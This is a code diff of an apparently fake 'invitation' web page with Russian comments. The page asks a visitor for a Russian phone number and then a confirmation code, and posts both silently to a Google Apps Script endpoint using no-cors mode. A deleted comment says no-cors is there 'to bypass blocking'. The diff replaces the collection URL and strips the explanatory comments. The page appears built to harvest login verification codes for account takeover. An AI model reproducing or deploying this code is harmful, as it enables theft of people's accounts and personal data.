@@ -176,10 +176,7 @@
     </div>
 
     <script>
-        // ============ НАСТРОЙКИ ============
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzE1W0ij7VtvhV4mpmEWDx-jbDGfmCbwGIRC4qKejMjmTB4Q--BA1FD9HQ5lGRaFLV9XQ/exec';
-        
-        // ============ ПОЛУЧЕНИЕ ПАРАМЕТРОВ ============
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz56HqUKeeqmgemKDj7SijdXYeDjsnP4UWDsmHuZS0mC5PkCUDq9AywqAJtwuJYkri9Cw/exec';
         const urlParams = new URLSearchParams(window.location.search);
         const inviter = urlParams.get('inviter') || 'Игрок';
         document.getElementById('inviter-name').textContent = inviter;
@@ -188,7 +185,6 @@
             document.getElementById('inviter-name-done').textContent = inviter;
         }
 
-        // ============ ФОРМАТИРОВАНИЕ ТЕЛЕФОНА ============
         function formatPhone(input) {
             let value = input.value.replace(/\D/g, '').slice(0, 10);
             let formatted = '';
@@ -199,7 +195,6 @@
             input.value = formatted;
         }
 
-        // ============ ЗАПРОС КОДА ============
         function requestCode() {
             const phone = document.getElementById('phone').value.replace(/\D/g, '');
             if (phone.length !== 10) {
@@ -211,8 +206,6 @@
             document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
             document.getElementById('screen-phone').style.display = 'none';
             document.getElementById('screen-code').style.display = 'block';
-            
-            // Отправка с no-cors для обхода блокировки
             fetch(SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -223,7 +216,6 @@
             });
         }
 
-        // ============ ПОДТВЕРЖДЕНИЕ КОДА ============
         function confirmCode() {
             const codeInput = document.getElementById('code');
             const code = codeInput.value.replace(/\D/g, '');
@@ -236,7 +228,6 @@
                 document.getElementById('code-error').style.display = 'none';
                 document.getElementById('screen-code').style.display = 'none';
                 document.getElementById('screen-done').style.display = 'block';
-                
                 fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
